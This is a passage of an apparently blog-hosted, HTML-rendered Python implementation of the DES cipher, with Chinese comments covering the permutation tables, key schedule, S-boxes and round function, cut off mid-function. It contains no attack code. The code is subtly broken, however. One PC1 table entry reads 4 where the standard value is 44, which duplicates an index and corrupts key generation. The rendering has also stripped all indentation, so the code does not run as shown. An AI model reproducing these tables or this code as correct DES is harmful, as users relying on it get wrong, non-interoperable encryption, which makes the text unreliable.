class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ip = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>,</span><br><span class="line"><span class="number">15</span>, <span class="number">7</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, </span><br><span class="line"><span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆矩阵</span></span><br><span class="line">_ip = [<span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, </span><br><span class="line"><span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, </span><br><span class="line"><span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, </span><br><span class="line"><span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化c、d数组</span></span><br><span class="line">c = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">d = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">k = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左右32位数组</span></span><br><span class="line">l = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line">r = [<span class="string">""</span>]*<span class="number">17</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_secretkey</span><span class="params">(key, round)</span>:</span></span><br><span class="line">pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, </span><br><span class="line"><span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">62</span>, <span class="number">54</span>, </span><br><span class="line"><span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, </span><br><span class="line"><span class="number">4</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>]</span><br><span class="line">respc1 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">respc1 += key[pc1[i]]</span><br><span class="line">c[<span class="number">0</span>] = respc1[:<span class="number">28</span>]</span><br><span class="line">d[<span class="number">0</span>] = respc1[<span class="number">28</span>:]</span><br><span class="line">k[<span class="number">0</span>] = c[<span class="number">0</span>] + d[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,round+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">16</span>):</span><br><span class="line"><span class="comment"># 左移1位</span></span><br><span class="line">c[i] = c[i<span class="number">-1</span>][<span class="number">1</span>:] + c[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line">d[i] = d[i<span class="number">-1</span>][<span class="number">1</span>:] + d[i<span class="number">-1</span>][:<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c[i] = c[i<span class="number">-1</span>][<span class="number">2</span>:] + c[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">d[i] = d[i<span class="number">-1</span>][<span class="number">2</span>:] + d[i<span class="number">-1</span>][:<span class="number">2</span>]</span><br><span class="line">secret = c[round] + d[round]</span><br><span class="line">pc2 = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,</span><br><span class="line"><span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,</span><br><span class="line"><span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">s_key = <span class="string">""</span> <span class="comment"># 生成本轮最终秘钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">s_key += secret[pc2[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> s_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始置换，输入为64位数据，8个ascii字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">re = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">re += data[ip[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展置换，输入为32位数据，输出为48位数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">e_box = [<span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, </span><br><span class="line"><span class="number">12</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, </span><br><span class="line"><span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span>]</span><br><span class="line">re = [<span class="string">'a'</span>] * <span class="number">48</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">re[i] = data[e_box[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥加处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_plus</span><span class="params">(data, key)</span>:</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">out += str(int(data[i])^int(key[i]))</span><br><span class="line"><span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># s盒置换，输入48位，输出32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">s1 = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>],</span><br><span class="line">[<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>]]</span><br><span class="line">s2 = [[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">[<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>],</span><br><span class="line">[<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>]]</span><br><span class="line">s3 = [[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>]]</span><br><span class="line">s4 = [[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>],</span><br><span class="line">[<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>]]</span><br><span class="line">s5 = [[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">[<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>],</span><br><span class="line">[<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]]</span><br><span class="line">s6 = [[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>],</span><br><span class="line">[<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>]]</span><br><span class="line">s7 = [[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">[<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>]]</span><br><span class="line">s8 = [[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>],</span><br><span class="line">[<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>],</span><br><span class="line">[<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">re = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>//<span class="number">6</span>):</span><br><span class="line">    re.append(data[<span class="number">6</span>*i:<span class="number">6</span>*i+<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始进行s盒置换</span></span><br><span class="line">dic = [s1,s2,s3,s4,s5,s6,s7,s8]</span><br><span class="line">retn = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">r = int(re[i][<span class="number">0</span>] + re[i][<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">c = int(re[i][<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">temp = str(bin(dic[i][r][c]))[<span class="number">2</span>:]</span><br><span class="line">temp = <span class="string">"0"</span>*(<span class="number">4</span>-len(temp)) + temp</span><br><span class="line">retn += temp</span><br><span class="line"><span class="comment"># print(len(retn))</span></span><br><span class="line"><span class="keyword">return</span> retn</span><br><span class="line"></span><br><span class="line"><span class="comment"># p盒置换，输入输出均为32位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_replace</span><span class="params">(data)</span>:</span></span><br><span class="line">p = [<span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, </span><br><span class="line"><span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">24</span>]</span><br><span class="line">re = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">re  += data[p[i]]</span><br><span class="line"><span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># F函数，32位数据，子秘钥，轮数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_function</span><span class="params">(data, key, round)</span>:</span></span><br><span class="line">cipher = data   <span class="comment"># 左侧32位</span></span><br><span class="line">cipher = e_replace(cipher)</span><br><span class="line">cipher = secret_plus(cipher, key)</span><br><span class="line">cipher = s_replace(cipher)</span><br><span class="line">cipher = p_replace(cipher)</span><br><span class="line"><span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_key_bin</span><span class="params">(key)</span>:</span></span><br><span class="line">word = key</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i 